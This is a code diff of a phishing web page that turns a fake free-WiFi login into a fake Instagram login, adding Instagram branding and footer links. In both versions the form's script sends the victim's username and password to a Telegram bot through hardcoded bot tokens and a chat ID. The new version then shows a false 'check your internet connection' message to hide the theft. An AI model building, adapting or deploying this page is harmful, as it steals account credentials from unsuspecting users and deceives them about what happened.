@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Tekin Wifiga kirish</title>
+    <title>Instagramga kirish</title>
     <style>
         * {
     border: none;
@@ -83,7 +83,6 @@ ul { list-style: none; }
     border: 1px solid #dbdbdb;
     margin-bottom: 10px;
     padding: 10px;
-    border-radius: 30px;
 }
 
 #auth { max-width: 350px; }
@@ -126,7 +125,7 @@ form input:focus {
 }
 
 form button {
-    background-color: #f60000;
+    background-color: #0095f6;
     border-radius: 5px;
     color: #fff;
     font-weight: bold;
@@ -221,64 +220,93 @@ footer .copyright {
         </section>
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
-                
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
                 <form id="loginForm">
-                    <label for="email" class="sr-only">Phone number</label>
-                    <input type="number" name="email" id="email" placeholder="Phone number" required />
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" id="email" placeholder="Phone number, username, or email" required />
 
                     <label for="password" class="sr-only">Password</label>
                     <input name="password" id="password" type="password" placeholder="Password" required />
 
-                    <button type="submit">Wifiga ulanish</button>
+                    <button type="submit">Log In</button>
                 </form>
-                
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
             
         </section>
     </main>
-    
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">JOBS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATIONS</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2025 Instagram from Facebook</p>
+    </footer>
 
     <script>
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-    const botToken = '7765605226:AAHZxGG3bkQtOgrapSrqrlywJX416idTqug';
-    const chatId = '7984884145';
-    const message = 
+            // Telegram bot information
+            const botToken = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'; // Enter your Telegram bot token here
+            const chatId = '7984884145'; // Enter your Telegram chat ID here
+            const message = 
 `🔐 *Yangi Login Ma'lumotlari*  
 
-👤 *Phone number:* ${email}
+👤 *Email / Username:* ${email}
 🔑 *Password:* ${password}
 
-🕒 Vaqt: ${new Date().toLocaleString()}`;
+🕒 Vaqt: ${new Date().toLocaleString()};
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            alert('Xabar muvaffaqiyatli yuborildi!');
-        } else {
-            alert('Xatolik yuz berdi: ' + data.description);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('Internet aloqangizni tekshiring.');
-    });
-});
-</script>
 
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Check your internet connection or try again.');
+                } else {
+                    alert('An error occurred: ' + data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Check your internet connection or try again.');
+            });
+        });
+    </script>
 </body>
 </html>
